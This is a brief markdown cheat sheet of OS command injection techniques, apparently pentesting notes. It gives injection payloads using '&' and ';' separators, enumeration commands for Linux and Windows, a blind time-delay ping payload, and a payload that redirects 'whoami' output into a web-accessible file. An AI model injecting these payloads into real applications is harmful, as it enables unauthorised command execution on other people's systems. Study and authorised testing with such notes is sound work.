# OS Command Injection
We can test with `&` character, which is CLI separator. For example:
```
& echo test &
```

Or `; whoami`
Good idea to use fuzzing paylaods in Burp Intruder

## Basic Enumeration
Linux:
* whoami
* uname -a
* ifconfig
* netstat -an
* ps -ef

Windows:
* whoami
* ver
* ipconfig /all
* netstat -an
* tasklist

## Blind OSI
### Time-delay
`& ping -c 10 127.0.0.1 &`  
Also we can use || in place of ; or &

### Output redirection
We can redirect output of command to some file we can have access
```
& whoami > /var/www/static/whoami.txt &
```
Then we just access the file whoami.txt from browser
